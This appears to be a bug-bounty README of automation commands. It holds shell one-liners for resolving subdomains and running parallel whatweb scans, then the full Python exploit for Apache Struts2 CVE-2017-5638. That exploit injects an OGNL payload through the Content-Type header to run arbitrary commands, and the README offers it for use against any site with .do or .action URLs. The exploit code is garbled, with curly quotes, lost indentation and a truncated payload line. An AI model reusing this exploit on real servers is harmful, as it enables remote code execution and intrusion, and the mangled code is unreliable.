<h1 align="center">👋 H1 there,  make your work easy with these automation commands</h1>                                                                                    # Automation Commands

### Find IP Address from list of subdomains 
``` while IFS= read -r line;do nslookup -type=A $line;done < subdomains.txt  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | anew ips.txt ``` 

### GNU parallel, you can run multiple whatweb scans simultaneously,
    cat http_200.txt | parallel whatweb {}
    
  ## Explanation:
  - cat http_200.txt outputs all URLs.
  - parallel whatweb {} runs whatweb on each line ({} is replaced by the URL).
  - By default, parallel runs as many jobs as you have CPU cores.
    
  ## Limit the number of concurrent jobs
    cat http_200.txt | parallel -j 10 whatweb {}
  - -j 10 limits it to 10 simultaneous scans (adjust based on your CPU/network).
  ## Show which URL is being scanned
      cat http_200.txt | parallel --tag whatweb {}
  - --tag prefixes the output with the URL, so you know which result belongs to which target.
   ## Save output to a file
       cat http_200.txt | parallel --tag whatweb {} > whatweb_results.txt```
  - All results are saved in whatweb_results.txt for later analysis.

---
# Web Vulnerability
if you see *.do and *.actions files extention in urls must try this using curl command in Content-Type header 



Public Exploit code for Exploiting CVE 2017–5638 (Source: Github)
#!/usr/bin/python
```
# -*- coding: utf-8 -*-

import urllib2

import httplib

def exploit(url, cmd):

payload = “%{(#_=’multipart/form-data’).”

payload += “(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).”

payload += “(#_memberAccess?”

payload += “(#_memberAccess=#dm):”

payload += “((#c>

payload+=”(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).”

payload += “(#ognlUtil.getExcludedPackageNames().clear()).”

payload += “(#ognlUtil.getExcludedClasses().clear()).”

payload += “(#context.setMemberAccess(#dm)))).”

payload += “(#cmd=’%s’).” % cmd

payload+=”(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).”

payload += “(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd})).”

payload += “(#p=new java.lang.ProcessBuilder(#cmds)).”

payload += “(#p.redirectErrorStream(true)).(#process=#p.start()).”

payload+=”(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).”

payload += “(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).”

payload += “(#ros.flush())}”

try:

headers = {‘User-Agent’: ‘Mozilla/5.0’, ‘Content-Type’: payload}

request = urllib2.Request(url, headers=headers)

page = urllib2.urlopen(request).read()

except httplib.IncompleteRead, e:

page = e.partial

print(page)

return page

if __name__ == ‘__main__’:

import sys

if len(sys.argv) != 3:

print(“[*] struts2_S2–045.py “)

else:

print(‘[*] CVE: 2017–5638 — Apache Struts2 S2–045’)

url = sys.argv[1]

cmd = sys.argv[2]

print(“[*] cmd: %s\n” % cmd)

exploit(url, cmd)
```

more Commands comming SOON......

